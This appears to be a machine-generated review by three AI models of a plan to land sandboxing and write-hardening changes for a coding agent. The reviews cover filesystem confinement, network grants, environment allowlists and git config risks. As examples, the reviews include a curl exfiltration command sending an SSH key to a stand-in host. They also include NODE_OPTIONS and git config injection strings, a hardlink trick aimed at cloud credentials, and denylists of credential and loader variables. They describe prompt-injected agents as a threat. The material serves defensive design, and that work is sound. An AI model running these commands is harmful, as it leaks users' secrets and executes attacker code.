# Review Swarm: plan

Swarm complete: 3/3 models, 54382ms total

## whatnot--ep-kimi-k3-server.us-west.modal.direct (53625ms, 9683 tok, finish=completed)

# Review: Plan to split and land PR #217

## Overall assessment

The split is sound in its ordering (Unit 1 is pure hardening with no behavior removal, so landing it first is safe), and converting decisions A–E from implicit to explicit is the right call. However, the plan has one structural gap (item 5 from #217 is scheduled in *no* unit), one technically impossible promise (network-denial attribution), and one first-week Linux breakage (toolchains live in `$HOME`, which the sandbox doesn't mount) that will make Unit 2 look broken on arrival. Details below, keyed to your questions.

---

## Q1: Is the split sound? Does Unit 1 depend on multi-root/resume?

Mostly sound, with two coupling risks to close before extraction:

1. **Provenance schema coupling.** Unit 1 lands "failed writes are observed and recorded." In #217 those events were written against a schema that also carries writable-root identity (item 5). Since provenance is append-only, whatever event shape Unit 1 ships is permanent — old readers must tolerate it and future events must remain parseable. If Unit 2/later multi-root work then needs a root field, you get either a breaking change or two event variants forever.
   **Smallest fix:** define the write-observation event in Unit 1 with an optional `root` field defaulting to the primary root, and require old readers to ignore unknown fields. Add a forward-compat test (event with unknown root field round-trips).

2. **The nlink check must be fd-based at apply time, not path-based at prepare time.** Rejecting `nlink > 1` only at prepare leaves the classic TOCTOU: attacker adds a hardlink between prepare and apply. The fd-anchored open makes this cheap to do right — `fstat` the opened descriptor at apply and re-check nlink there. Require a negative test: hardlink created between prepare and apply must fail the write.

On the open question (hardlink rejection on reads): **writes-only rejection is correct.** Reading a hardlinked file mutates nothing; the hazard was always writes through a shared inode. Keep reads unrestricted, but note the write-side check must handle the case where the *path* was swapped to a hardlink of an outside-tree file with byte-identical content (preimage comparison alone won't catch it; the fd-based nlink check will).

**F36 fix needs one more edge case specified.** Storing the checkpoint before the destructive write creates a new failure mode: checkpoint written, write fails or process crashes before the write. Now a checkpoint exists for a write that never happened, and a later rollback will restore the preimage over whatever is currently there — including legitimate intervening user edits. **Smallest fix:** rollback must verify current bytes match the expected post-write state before restoring, and prompt (not silently restore) when they don't. Also specify: if the checkpoint write itself fails, the destructive write must not proceed (fail closed). Require tests for both: crash-between-checkpoint-and-write, and rollback-with-intervening-edit.

## Q2: macOS host execution as interim

Acceptable **only** if the allowlist prerequisite is a hard gate on Unit 2, not "before or with." On macOS, host execution means the static allowlist is the *entire* confinement story, and F01/F02/F34 show it is currently broken in ways that chain (auto-approved `uniq` writes `.git/config`, auto-approved `git status` executes it). Even after the list/grammar fixes, static shell analysis is structurally evadable (`xargs`, `find -exec`, nested `sh -c`, quoting tricks) — so the posture being adopted is "informed consent," and it must be implemented as such:

- The "unsandboxed" indicator must be persistent in the TUI **and** the Full Access grant dialog on macOS must say "unsandboxed" explicitly, not just imply it via the indicator.
- Record the backend per session in `session.start` (planned) **and** mark each host-executed command in provenance, so post-hoc audit can distinguish sandboxed from unsandboxed execution without inferring it from the session header.
- Require macOS/Linux parity tests for the permission decider: anything that would be confined on Linux must at minimum prompt on macOS.

Two residual risks the plan doesn't mention:

- **Agent-invoked git on macOS host mode.** #217 disables side-effect configs only for the tool's *own* git invocations. An agent running `git status` via `run_shell` in a malicious repo still honors `core.fsmonitor`/`core.hooksPath` from the repo config — confined on Linux, unconfined on macOS, and the user will reflexively approve the `git status` prompt. **Smallest fix:** on macOS host mode, inject the same config-neutralizing overrides (`-c core.hooksPath=/dev/null`, etc., or `GIT_CONFIG_COUNT`-style env) for agent-run git too, or document this as a known residual risk in the ADR.
- **"Interpreter-honored paths" must be enumerated, not gestured at.** `.git/` is necessary but not sufficient: `.git/hooks/*`, `.gitmodules`, `.git/info/attributes`, `.cargo/config.toml`, `.npmrc`, `package.json` script fields are all write-targets-that-become-execution. Require an explicit denylist with one regression test per entry.

## Q3: Network grant granularity

Per-session is too coarse as the only option (one grant for `cargo fetch` later covers `curl evil.com`), but **per-destination is infeasible with bwrap** — it's a namespace tool, not an L7 filter; per-destination would require a proxy sidecar and is a separate project. The realistic granularity is per-command with an optional "remember for this session" cache, recorded per-grant in provenance.

More important: **the plan promises something unimplementable.** "A per-command prompt when a command is denied for network reasons" — bwrap with no network namespace just fails syscalls; the tool sees a nonzero exit and stderr (`Connection refused`, `Temporary failure in name resolution`), not a structured "denied: network" signal. There is no reliable attribution. **Smallest fix:** drop the attribution claim. Instead, when a sandboxed command fails, the tool result includes a "retry with network" affordance that triggers the permission prompt. This also fixes discoverability: the agent learns network exists as a grantable capability from the failure path.

Related first-week issue: network-off also isolates **localhost**. A dev server started by the agent inside the sandbox is unreachable from the user's browser. This will be reported as a bug within days. Document the workaround (network grant) in the tool result text when a long-running server process is detected, or at minimum in the ADR/docs.

## Q4: Environment allowlist failure modes

Yes, there are serious ones, and they partially **void the F34 fix**:

- **`GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n`** set arbitrary git config via environment — including `core.hooksPath` — without touching `.git/config`. If these pass through, disabling side-effect configs and denying `.git/` writes accomplishes nothing. These must be on an explicit denylist.
- **Code-execution-via-env in "innocuous" toolchain variables:** `NODE_OPTIONS=--require /path/evil.js`, `RUSTFLAGS` (can point the linker at an arbitrary binary), `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `GIT_SSH_COMMAND`, `GIT_ASKPASS`, `PAGER`/`GIT_PAGER`, `EDITOR`/`VISUAL`, `PROMPT_COMMAND`. The plan lists `NODE_OPTIONS` as a *passthrough example* — on macOS host mode that is a direct code-exec channel.
- **Loader variables:** `LD_PRELOAD`/`LD_LIBRARY_PATH`/`DYLD_INSERT_LIBRARIES` — mostly neutralized inside bwrap's confined filesystem, but live on macOS host mode.
- **Credentials:** `SSH_AUTH_SOCK`, `AWS_*`, `GITHUB_TOKEN`, `DOCKER_HOST`, `~/.netrc` via `HOME`. "Secrets never passed unless explicitly granted" needs a concrete pattern list and tests, not a principle.

**Recommendation:** default-deny with an explicit allowlist (as planned) **plus** a hard denylist that even user configuration cannot override, applied on all backends, and a stricter effective set on macOS host mode (since there's no filesystem confinement to catch what env vars miss). Require injection tests: attempt `GIT_CONFIG_COUNT`-based hooksPath injection and `NODE_OPTIONS=--require` through the shell tool and assert neither reaches the subprocess.

## Q5: Run-and-report-incomplete vs. blocking

Run-and-report is the right choice — blocking at 4,096 entries makes the shell tool unusable in any repo with `node_modules`, `target/`, or a mature `.git/objects`, i.e., most real projects. But two things are required to keep it from becoming a worse hazard:

1. **The agent-visible tool result must state incompleteness prominently**, not just carry a structured field. The model reads tool output text; if the text says "no changes" with a metadata flag, the agent *will* believe a destructive command changed nothing. Require a rendering test: the agent-facing message for incomplete observation must be textually distinct from "no changes," and the provenance event must record `{ reason, bound }` (planned — make it a hard requirement, not just on the shell result struct).
2. **The bound will be hit constantly, so "incomplete" becomes noise that users and the agent learn to ignore.** **Smallest fix:** exclude known-noise directories (`.git/objects`, `node_modules`, `target`) from the count, or raise the bound substantially, so "incomplete" stays rare enough to mean something. Also handle the before-snapshot overflow case explicitly: if the *baseline* overflows, there is no diff at all — that must be reported as "not observed," never as "no changes."

## Q6: First-week breakage the plan misses

1. **Toolchains live in `$HOME`; the sandbox mounts only the workspace.** `cargo` is in `~/.cargo/bin`, node via nvm in `~/.nvm`, pyenv in `~/.pyenv`, asdf shims in `~/.asdf`. Passing `CARGO_HOME`/`PATH` through the environment is useless when those paths don't exist inside the namespace. On Linux, `run_shell("cargo build")` fails with command-not-found the moment Unit 2 lands. This is the single biggest gap in the plan. **Smallest fix:** the sandbox profile must read-only-bind the toolchain directories implied by the env allowlist (CARGO_HOME, RUSTUP_HOME, nvm/pyenv/asdf dirs as detected), with a conformance test that `cargo --version` and `node --version` succeed inside the sandbox.
2. **bwrap-present-but-broken is not detected.** Ubuntu 23.10+ restricts unprivileged user namespaces via AppArmor; hardened kernels disable them; Docker containers commonly block them; WSL1 lacks them. Checking for the bwrap binary is insufficient. **Smallest fix:** probe at session start by executing a trivial sandboxed command, record the probe outcome in `session.start`, and on failure emit an actionable error (not "tool unavailable"). Note this also means *Linux* sometimes hits the host-mode fallback — the plan's "only where no sandbox backend exists" clause covers it, but the ADR must stop claiming "fail-closed on Linux" as an absolute.
3. **Item 5 is scheduled in no unit.** Multi-root provenance, resume root-identity validation, attachment roots, and `.worktrees` restrictions are explicitly excluded from Unit 1 and absent from Units 2 and 3. Either create Unit 2.5/4 for them or state explicitly that they're deferred and why that's safe (resume currently trusts root identity — is that acceptable to ship for another cycle?).
4. **ADR 0014 timing.** Amending the ADR now to declare fail-closed "accepted" records a decision Unit 2 partially reverses (host mode retained under Full Access; network grantable; env allowlisted). Move the ADR amendment into Unit 2 and have it record the *actual* decisions A–E.
5. **macOS prompt fatigue.** Removing git from static-safe plus requiring decisions for `cd`-compounds and globs means a prompt for `git status` in every session. Consider (follow-up, not blocker) a read-only git subcommand allowlist using the same config-neutralizing flags the tool already applies to its own invocations.

---

## Tests to require (consolidated)

**Unit 1:** hardlink added between prepare and apply (fd-based nlink recheck); crash between checkpoint and write; rollback with intervening user edit after failed write; checkpoint-write failure aborts the destructive write; provenance event forward-compat with unknown root field; existing negative tests (symlink substitution, bind mount, FIFO) confirmed to run without multi-root fixtures.

**Prerequisite (allowlist):** one regression test per denied interpreter-honored path; probe-suite conversion as planned; `uniq`-with-output-operand no longer auto-approved.

**Unit 2:** sandbox probe with userns disabled (simulated) → correct fallback + provenance record; env denylist injection tests (`GIT_CONFIG_COUNT`, `NODE_OPTIONS`, `BASH_ENV`); network grant recorded per-grant in provenance; incomplete-observation rendering distinct from "no changes" in agent-visible text; toolchain availability inside sandbox; macOS/Linux permission-decider parity; unsandboxed indicator present in TUI and Full Access dialog on macOS.

**Unit 3:** shared conformance suite run on macOS CI, with an explicit list of where Seatbelt semantics diverge from bwrap (env handling, network denial granularity) rather than "where the platform allows" as an escape hatch.

## Bottom line

Approve the split direction with conditions: (1) schedule item 5 somewhere or explicitly defer it; (2) make the allowlist prerequisite a hard blocker on Unit 2; (3) fix the toolchain-mount gap before Unit 2 ships or Linux users will experience Unit 2 as a regression; (4) replace the impossible network-denial attribution with a retry-with-grant affordance; (5) add the env denylist, or the F34 mitigation is theater; (6) move the ADR amendment to Unit 2.

## whatnot--ep-glm-5-3-flash-server.us-west.modal.direct (54367ms, 10130 tok, finish=completed)

# Review: Plan for splitting PR #217

**Overall verdict:** The three-unit split is directionally sound, and deciding A–E explicitly is correct. But the plan has one unresolved dependency that can break Unit 1's test suite, one provenance-completeness hole in the Unit 2 sandbox design (HOME/toolchain mounts), an env-allowlist design that is worse than clearenv for exactly the variables it names, and several orphaned items from #217 that the split silently drops. Details below, ordered by severity.

---

## Blocking findings

### B1. Unit 2's bwrap design violates the provenance-completeness invariant unless HOME and toolchain mounts are specified (Q6, biggest miss)

"Workspace-only filesystem" is underspecified in a way that either breaks every toolchain in week one or silently breaks the core invariant. Three cases:

- If `$HOME` inside bwrap is the **real home**, sandboxed commands can write `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` etc. — outside every workspace root, so the before/after snapshot never sees it and **provenance records nothing**. The append-only log now claims an incomplete account of side effects. This is worse than F02 because it defeats the observation layer, not just confinement.
- If `$HOME` is remapped to the workspace or tmpfs, then `~/.cargo`, `~/.rustup`, `~/.npm`, Go module caches are unreachable and `cargo build` / `npm install` fail immediately — every user hits this on day one.
- The env allowlist passes `CARGO_HOME`/`RUSTUP_HOME` through, but if those host paths aren't mounted inside the sandbox, the variables point at nonexistent directories and tools fail with confusing errors.

**Smallest fix:** specify the mount policy in the plan text: system dirs (`/usr`, `/bin`, `/lib`, `/proc`, `/dev`) read-only; `$HOME` **not** mounted; toolchain homes mounted **read-only** with caches either redirected to a tmpfs or explicitly declared as rw-with-provenance-implication. Add a conformance test: "sandboxed command writes to `$HOME` → must fail, and must never succeed unobserved."

### B2. bwrap may not exist on the exact Linux distros your users run

bwrap requires unprivileged user namespaces. Ubuntu 24.04 restricts unprivileged userns via AppArmor by default in common configurations; some enterprise distros disable them entirely. Under "fail closed," a large fraction of Linux users lose `run_shell` and `git_*` on day one, and the plan has no detection story, no user-facing explanation, and no documented fallback.

**Smallest fix:** add to Unit 2: (a) a sandbox-availability probe with a specific, actionable error ("user namespaces disabled — see docs"); (b) a CI job on a userns-restricted image asserting the fail-closed path produces that error, not a cryptic bwrap failure; (c) an explicit decision in the ADR about whether a distro-level userns restriction counts as "no usable sandbox" (it should, and the ADR currently doesn't contemplate it).

### B3. The environment allowlist as specified is a code-execution channel, not just a leak channel (Q4)

The plan names `NODE_OPTIONS` as a passthrough "toolchain variable." `NODE_OPTIONS=--require /path/to/attacker.js` is arbitrary code execution into every Node process the command spawns. The same class: `RUSTFLAGS` (linker args), `RUSTUP_HOME` (toolchain swap), `PYTHONSTARTUP`, `BASH_ENV`, `ENV`, `CDPATH`, `GIT_*` (e.g. `GIT_CONFIG_GLOBAL`, `GIT_DIR` — which also defeats the git side-effect-config work in item 5), `DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`. A default-allow list of innocuously named variables is the wrong default; the audit-grade answer is **clearenv + explicit passthrough**, with:

- a hardcoded deny-list that **overrides user configuration** (the variables above),
- `PATH` constructed for the sandbox view, not passed through verbatim,
- `IFS` always reset.

The plan's own framing ("secrets are never passed through unless explicitly granted") is undetectable in general — you cannot reliably recognize a secret by variable name. Default-deny is the only enforceable version of that sentence. This also answers Q4: yes, clearenv-plus-list, with the deny-list winning over user config.

### B4. Unit 1's test suite cannot run as specified

The negative tests include "nested bind mount" — that requires the bwrap harness, which lands in Unit 2. Either the test moves to Unit 2, or Unit 1 must ship a standalone harness that creates bind mounts without the sandbox layer. Decide now; otherwise Unit 1 either lands with a skipped test (silent coverage loss) or is secretly blocked on Unit 2. This is the concrete answer to Q1: extraction is otherwise safe (the fd-anchored write path doesn't reference multi-root logic), but the *test matrix* does depend on Unit 2 infrastructure.

### B5. The F36 fix as stated can reintroduce F04 through rollback

Moving checkpoint-store before the write closes the "no preimage after crash" window but opens a new one: crash between checkpoint-store and write leaves a checkpoint for a write that never happened. If rollback then restores the preimage unconditionally, it clobbers whatever is currently on disk — including intervening user edits, which is exactly the F04 class #217 fixed. **Required:** rollback must verify current file bytes match the expected post-write state (or the recorded post-write hash) before restoring the preimage, and no-op otherwise. Add a crash-injection test: kill between store and write, roll back, assert the file is untouched.

---

## Significant findings

### S1. Hardlink reads on macOS are an exfiltration channel during the unsandboxed interim (Q1 open question)

The proposal (reject hardlink writes, allow reads) is reasonable for Linux, where shell is confined. But under Unit 2's macOS host fallback, an agent-run command can `ln ~/.aws/credentials ./payload` (same filesystem), and the read path then happily reads it. The nlink>1 check at fd-open time is TOCTOU-safe, so the mechanism is fine — the policy is what's wrong. **Smallest fix:** allow hardlink reads only when a sandbox backend is active; on unsandboxed backends, prompt. Also require the write-rejection error message to say "file has multiple links; copy then edit" or pnpm/cargo-vendor users will file this as a bug daily.

### S2. "Honest unsandboxed indicator" is too weak a control for headless use (Q2)

A TUI status indicator fails in exactly the mode where risk is highest: non-interactive/CI runs nobody watches. Host fallback is acceptable **only** with all of: (a) the allowlist prerequisite as a hard merge gate for Unit 2, not "before or with"; (b) the unsandboxed state surfaced **at each permission prompt** (the decision point), not just in a status bar; (c) a per-command sandbox flag in provenance, not only `session.start` — host mode is per-command-eligible under Full Access, so a session-level record is already wrong; (d) headless mode requires an explicit CLI flag to permit unsandboxed execution; (e) a dated criterion for flipping macOS to fail-closed if Unit 3 slips — otherwise Unit 3 is a permanent "follow-up." Note also the ADR 0014 amendment must be rewritten to describe *honest degradation*, not the fail-closed posture the PR currently declares; landing the stale ADR alongside this plan creates a documented decision nobody made.

### S3. Per-session network grant is too coarse under prompt injection (Q3)

One "yes" to a legitimate `cargo build` grants every later command in the session network access, including a prompt-injected exfil command. Per-destination is infeasible with bwrap. **Smallest sound design:** per-command grant as the default with an explicit "remember for this session" opt-in (same UX cost, safer default), plus a cheap middle tier: **loopback-only networking** — this covers localhost dev servers (the plan's own example) without enabling exfiltration, and bwrap can express it. Also define grant scope against resume: a session grant must expire on resume unless renewed, or "per-session" silently becomes "forever" — and note this interacts with the deferred resume/root-identity work (see S5). Finally, the deny-then-reprompt flow means the command partially executed before the network failure; specify rerun semantics and confirm the snapshot records the partial effects.

### S4. Snapshot: run-and-report is right, but the signal must be model-salient (Q5, E)

Blocking at 4,096 entries makes ordinary `cargo build`/`npm install` runs fail to start — operationally worse, and users will disable the feature. Run-and-report (O3) is correct, but a structured field the model may ignore recreates the original bug ("silently reported no changes") one indirection later. Require: the tool result **text** leads with the warning ("file observation incomplete: bound 4096 reached; changes may be unreported"), the result carries a distinct non-success status, and provenance records `{reason, bound}`. Two more: (a) 4,096 per root is low for real trees — make the bound configurable and raise the default; (b) under *blocking* semantics, a planted symlink farm (5k symlinks) is a DoS on the shell tool — one more argument for run-and-report. Also specify interplay with rollback: if observation is incomplete, what does rollback restore?

### S5. The split orphans #217 items with no scheduled home

Multi-root provenance records, resume root-identity validation, attachment roots, and `.worktrees` restrictions appear in no unit. The resume/root-identity fix in particular is a real security fix #217 was making (same path, replaced workspace → stale provenance replay). The plan should either schedule a Unit 4 or explicitly document the gap and its interim risk. Silent omission is how the next audit finds F37.

### S6. Consider making static-safe git conditional on sandbox presence

Removing git from the static allowlist degrades Linux UX to solve a macOS problem. Where an enforced sandbox exists, auto-approving `git status` inside bwrap (network off, `.git/` write-denied, side-effect configs disabled) is defensible. Smallest change: static-safe set is a function of the active backend. Not required, but it prevents the prerequisite work from generating avoidable prompt fatigue that pushes users toward Full Access — which is the actual risk amplifier on macOS.

---

## Required tests (beyond what the plan lists)

1. Crash-injection between checkpoint-store and write; rollback must no-op (B5).
2. Replay of pre-Unit-1 event logs against post-Unit-1 code and vice versa — the failed-write observation and `observation: incomplete` fields are schema changes against an append-only log (Q1).
3. Sandboxed command attempting a write under real `$HOME` → fails, never succeeds unobserved (B1).
4. CI on a userns-restricted image asserting the fail-closed error path (B2).
5. macOS, no backend: provenance contains per-command sandbox field; headless run without the explicit flag refuses (S2).
6. Hardlink-planted sensitive file read on macOS unsandboxed → prompts (S1).
7. Symlink-farm workspace (5k symlinks) → command runs, result reports incomplete, no DoS (S4).
8. Session network grant does not survive resume (S3).
9. Env deny-list: user profile exports `NODE_OPTIONS`/`GIT_CONFIG_GLOBAL`/`DYLD_INSERT_LIBRARIES` → stripped even when the user allowlists them (B3).
10. Convert the existing allowlist probe suite into regression tests as a merge gate for Unit 2 (prerequisite section — make the ordering explicit: prerequisite → Unit 1 → Unit 2, or Unit 1 → prerequisite → Unit 2 with the gate enforced).

## Sequencing summary

Prerequisite allowlist fixes (hard gate) → Unit 1 (move bind-mount test, add B5 rollback verification, resolve hardlink-read policy per S1) → Unit 2 (specify B1 mount policy and B2 detection before implementation; adopt B3 clearenv design; S3 grant semantics) → Unit 3 with a dated fail-closed criterion (S2). Schedule or explicitly defer the orphaned #217 items (S5). Rewrite ADR 0014 to match the decision actually being made.

## whatnot--ep-qwen3-8-2-4t-a95b-server.us-west.modal.direct (32750ms, 7460 tok, finish=completed)



# Review of the Landing Plan for PR #217

## Overall Assessment

The three-unit split is the right structural move for a 10.9k-line PR, and surfacing decisions A–E explicitly is necessary. However, the plan has several gaps in ordering guarantees, under-specified security boundaries, and at least one decision (environment allowlist) that introduces a new attack surface wider than the one it closes. I'll address each unit, the prerequisite, and the reviewer questions in turn.

---

## Unit 1: Structured Stale-Write and Path Hardening

### 1a. F36 checkpoint ordering: "store before write" is necessary but not sufficient

The plan says to store the rollback checkpoint *before* the destructive write. This fixes the crash-between-write-and-checkpoint window, but introduces the inverse: a crash between checkpoint-store and the write itself leaves a checkpoint for a write that never happened. On resume, the rollback logic must tolerate a checkpoint whose corresponding mutation is absent. Specify that the checkpoint record carries a `status: prepared | applied` field and that rollback is a no-op for `prepared`-only entries. Without this, the fix trades one data-loss window for a spurious-rollback window.

**Smallest change:** add a two-phase status to the checkpoint record; rollback skips `prepared`-only entries.

### 1b. Hardlink policy: the read/write asymmetry has a TOCTOU consequence

Allowing hardlink reads while rejecting hardlink writes is pragmatic for pnpm/Nix/cargo-vendor layouts. But the preimage-verification logic (item 1: "edits verify the exact prepare-time preimage bytes at apply") reads through the fd at prepare time and re-reads at apply time. If the file has nlink > 1, another process can mutate the content through the sibling link between prepare and apply, and the preimage check will correctly reject the write—but the *read* the agent performed at prepare time may have observed transient content injected via the sibling link. This is a read-integrity issue, not a write-integrity issue.

**Recommendation:** accept the asymmetry for writes, but for reads of hardlinked files, record `nlink` and the device/inode pair in the provenance read-event so that downstream reasoning can flag the observation as potentially non-exclusive. Do not block the read. Add a test: two hardlinks to the same file, mutate through link B between prepare and apply, assert the write is rejected and the provenance records the nlink count.

### 1c. Extraction safety and the multi-root question (Reviewer Q1)

The plan says "keep the current single primary-root model" and "do NOT import … attachment roots." This is safe *only if* the fd-anchored open path does not reference a `Vec<Root>` or a `RootSet` type that Unit 2/3 will later generalize. Inspect the PR's `confined_open` / `resolve_within_root` signatures. If they take a `&WorkspaceRoot` (singular), extraction is clean. If they take `&[WorkspaceRoot]` or an iterator, you will need to either (a) land a one-element slice wrapper now, or (b) refactor the signature in Unit 2, which means Unit 1's tests will need updating. This is not a blocker but must be verified before the split commit is cut.

**Required test:** a compile-time assertion (or integration test) that Unit 1's public API surface does not mention `attachment_root`, `writable_roots` (plural), or `resume_root_identity`. This prevents accidental coupling from leaking across the split boundary.

### 1d. O_NOFOLLOW on the final component only

The plan says "the final path component is opened O_NOFOLLOW." Confirm that every intermediate directory component is opened with O_DIRECTORY and resolved stepwise, not via a single `openat` with a relative path that the kernel resolves in one shot. A single `openat(dirfd, "a/b/c", O_NOFOLLOW)` still follows symlinks in `a/` and `a/b/`. The existing negative tests include "symlink substitution" and "root substitution," but add a test for an intermediate-directory symlink: workspace root contains `a -> /outside`, and the agent requests a write to `a/file.txt`. This must be rejected.

---

## Unit 2: Sandboxed Subprocess Execution

### 2a. macOS interim: the prerequisite is not actually a prerequisite as written (Reviewer Q2)

The plan says "land the audit's allowlist fixes before or with Unit 2." The phrase "or with" is the problem. If the allowlist fixes (removing `uniq`, denying `.git/` writes, handling globs and `cd` compounds) land *in the same merge* as Unit 2, there is a window—however small—where a macOS user on a nightly or a fast-follow release has Unit 2's "honest unsandboxed indicator" but still has F01/F02/F34 exploitable. More importantly, the allowlist fixes are described as "small list/grammar edits," but F02 (glob expansion, `cd` compound parsing, `--follow` traversal) is a parser change, not a list edit. Underestimate this at your peril.

**Smallest change:** make the allowlist fixes a hard gate. Unit 2's merge commit must not be reachable without the allowlist-fix commit being an ancestor. Encode this in the CI merge queue, not in a comment on the PR. Additionally, on macOS, until Unit 3 lands, the permission decider should default to *prompt* for any command not in the (post-fix) allowlist, rather than auto-approving. The "unsandboxed" TUI indicator is necessary but not sufficient; a user staring at a long agent session will stop noticing a status bar color.

### 2b. Network grant granularity (Reviewer Q3)

Per-session is too coarse for a security boundary. A session can span hours and dozens of agent turns. If the agent is tricked into running `curl http://evil.example/exfil?data=$(cat ~/.ssh/id_rsa)` in turn 3, a per-session network grant from turn 1 covers it. Per-command is the right granularity for the *prompt*, but the *grant* should be per-destination or per-protocol+port, not a blanket "network on."

**Recommendation:** the permission prompt should say "Command `cargo build` requests network access. Allow network for this command? [y/N/always-for-cargo]". The "always" option records a per-tool or per-binary grant in provenance, not a per-session grant. The sandbox profile should implement this as a seccomp/landlock filter on `connect()` syscalls rather than a network-namespace toggle, so that localhost-only access (for dev servers) can be granted without full egress. If that's too complex for Unit 2, then: default off, per-command prompt, no "always" option yet. Add the "always" granularity in a follow-up. Do not ship per-session as the only option.

### 2c. Environment allowlist: NODE_OPTIONS is in the list and is a code-execution vector (Reviewer Q4)

The proposed allowlist includes `NODE_OPTIONS`. This variable can contain `--require /path/to/module.js`, which executes arbitrary JavaScript in every Node process. If the agent's shell tool runs `node build.js` inside the sandbox, and the host environment has `NODE_OPTIONS=--require /tmp/payload.js` (set by a malicious `.env`, a compromised shell profile, or a prior agent turn that wrote to the user's rc file), the sandbox inherits code execution. `LD_PRELOAD` is the obvious analogue, but the plan's allowlist explicitly names `NODE_OPTIONS` as a "toolchain variable."

Similarly, `CARGO_HOME` and `RUSTUP_HOME` redirect where Cargo reads its configuration and toolchains. A manipulated `CARGO_HOME` pointing to an attacker-controlled directory lets `cargo build` execute arbitrary build scripts from a fake registry cache.

**Smallest change:** split the allowlist into two tiers:
- **Tier 1 (always passed):** `PATH`, `HOME`, `LANG`, `LC_*`, `TERM`, `SHELL`, `USER`.
- **Tier 2 (passed only if the sandbox profile explicitly needs them, and sanitized):** `CARGO_HOME`, `RUSTUP_HOME`, `GOPATH`, `NODE_OPTIONS`, `PYTHONPATH`. For `NODE_OPTIONS`, strip `--require` and `--import` flags before passing. For `CARGO_HOME`/`RUSTUP_HOME`, validate they point inside the workspace or a known system path.

Add a test: set `NODE_OPTIONS=--require /tmp/evil.js` in the host environment, run `node -e "console.log(1)"` inside the sandbox, assert the require does not execute.

Also: `DYLD_INSERT_LIBRARIES` (macOS) and `LD_AUDIT` / `LD_DEBUG` (Linux) must be in the explicit *deny* list, not merely absent from the allowlist. If the implementation uses a "pass only what's listed" model, absence is sufficient, but document this and add a test that sets `LD_PRELOAD` in the host env and asserts it is not visible inside the sandbox.

### 2d. Bubblewrap availability and failure UX

The plan says "if no usable sandbox exists, shell and git tools fail closed." On Linux, this can happen inside containers (Docker, Podman, CI runners) where user namespaces are disabled (`kernel.unprivileged_userns_clone=0`, seccomp profiles blocking `unshare`, or `/proc/sys/user/max_user_namespaces` set to 0). The plan does not specify *how* the tool detects this at startup vs. at first shell invocation, or what the user sees.

**Required behavior:** probe at startup (attempt a trivial `bwrap --ro-bind / / true`). If it fails, log a specific diagnostic to stderr and to the TUI status area naming the likely cause (e.g., "user namespaces unavailable; are you inside a container without `--privileged`?"). Do not wait until the agent's first shell call to discover this. Add a `--check-sandbox` CLI flag that runs the probe and exits, for CI scripts.

### 2e. Snapshot bound: "run and report incomplete" needs agent-loop integration (Reviewer Q5)

Recording `observation: incomplete { reason, bound }` in the shell result is correct for provenance, but the plan does not specify what the *agent* sees. If the agent's system prompt or tool-result schema says "files changed: []" when the snapshot overflowed, the agent will reason "the command had no effect" and proceed—potentially skipping a necessary follow-up or, worse, concluding a destructive command was safe because "nothing changed." The 4,096-entry bound will be hit routinely in monorepos (`node_modules`, `target/`, `.git/objects`).

**Smallest change:** the tool result returned to the agent must contain an explicit `snapshot_truncated: true, entries_observed: 4096, entries_estimated: >4096` field. The agent's system prompt must include an instruction: "If `snapshot_truncated` is true, you cannot rely on the file-change list to determine whether the command had side effects. Assume it did." Additionally, exclude `.git/objects`, `node_modules`, and `target/` from the snapshot walk by default (they are rarely the interesting diff), and make the exclusion list configurable. This raises the effective bound without raising the actual bound.

### 2f. Git side-effect config disabling is incomplete

The plan disables `hooksPath`, `fsmonitor`, external diff, and `textconv` for the tool's own git invocations. Missing:
- `.gitattributes` `filter.*.clean` / `filter.*.smudge` commands (executed on `git add`, `git checkout`).
- `core.pager` (can execute arbitrary commands).
- `credential.helper` (can exfiltrate or inject credentials).
- `protocol.*.allow` / `url.*.insteadOf` (can redirect fetches).
- `include.path` in `.gitconfig` / `.git/config` (can pull in arbitrary config from outside the workspace).

**Smallest change:** invoke the tool's git commands with `-c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.pager=cat -c credential.helper= -c filter.*.clean=true -c filter.*.smudge=true` and `GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null HOME=/dev/null` (or the sandbox equivalent). Better: use `git -c include.path=` to neutralize includes. Add a test: plant a `.gitattributes` with `* filter=evil`, set `filter.evil.clean=touch /tmp/pwned`, run the tool's `git status`, assert `/tmp/pwned` does not exist.

---

## Unit 3: macOS Seatbelt Backend

### 3a. Seatbelt is deprecated and its profile language is undocumented

`sandbox-exec` and the Seatbelt profile language (`(version 1)(deny default)(allow file-read* ...)`) have been deprecated since macOS 10.15 and Apple has removed the man pages. The profile schema changes between macOS releases without notice. Building a security boundary on an undocumented, deprecated API is a maintenance liability.

**Recommendation:** Unit 3 should be scoped as an *investigation* milestone first: validate that Seatbelt can express the required policy (workspace-only FS, no network, no process-spawn outside the sandbox) on macOS 13, 14, and 15. If it cannot, or if the profile language has regressed, the fallback is Apple's Endpoint Security framework (requires a system extension and user approval, heavier) or a FUSE-based confinement layer. Do not commit to Seatbelt in the plan; commit to the *abstraction* (`SandboxProfile` trait) and let the investigation pick the backend.

### 3b. Conformance test parity

The plan says "same conformance tests as bwrap where the platform allows." Define "where the platform allows" explicitly. Seatbelt cannot prevent hardlink creation the way a mount-namespace can. It cannot block `/proc`-equivalent introspection (macOS has no `/proc`, but `sysctl` and `task_for_pid` are analogous). List the tests that will be skipped on macOS and the compensating controls, so a future reviewer doesn't assume parity that doesn't exist.

---

## The Prerequisite: Static Allowlist Fixes

### P1. This is not "small list/grammar edits"

F02 requires:
- Glob expansion *before* path-confinement checking, which means the tool must perform or simulate shell globbing. This is a parser change.
- `cd a && cat x` must be evaluated against the post-`cd` working directory, which means the tool must track `cd` side effects in compound commands. This is a mini shell-interpreter change.
- `rg --follow` / `-L` detection requires parsing tool-specific flags, which is an arms race.

Calling these "small list/grammar edits" will cause them to be estimated at a day and land with insufficient review. Budget them as a parser/interpreter change with its own test suite. The existing probe suite is a starting point, not a completion criterion.

### P2. `.git/` as a denied write target

The plan says to treat `.git/` as a denied write target for static-safe commands. Extend this to `.gitconfig`, `.gitmodules`, `.gitattributes`, and any dotfile that an interpreter will source (`.bashrc`, `.zshrc`, `.npmrc`, `.cargo/config.toml`). The F34 attack (`uniq payload .git/config` → `git status` executes hooks) generalizes to any config file that a subsequent auto-approved command will interpret.

---

